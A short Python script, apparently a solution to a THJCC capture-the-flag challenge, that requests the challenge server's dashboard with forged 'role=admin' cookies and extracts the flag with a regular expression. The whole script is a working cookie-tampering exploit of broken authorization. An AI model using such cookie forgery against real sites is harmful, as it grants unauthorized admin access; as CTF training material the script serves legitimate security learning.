import requests
import re

url = "http://chal.thjcc.org:3000"

res = requests.get(f'{url}/dashboard', cookies={
    'role': 'admin',
    'username': 'a'
})

flag = re.findall(r'(THJCC{.+})', res.text)[0]
print("Flag:", flag)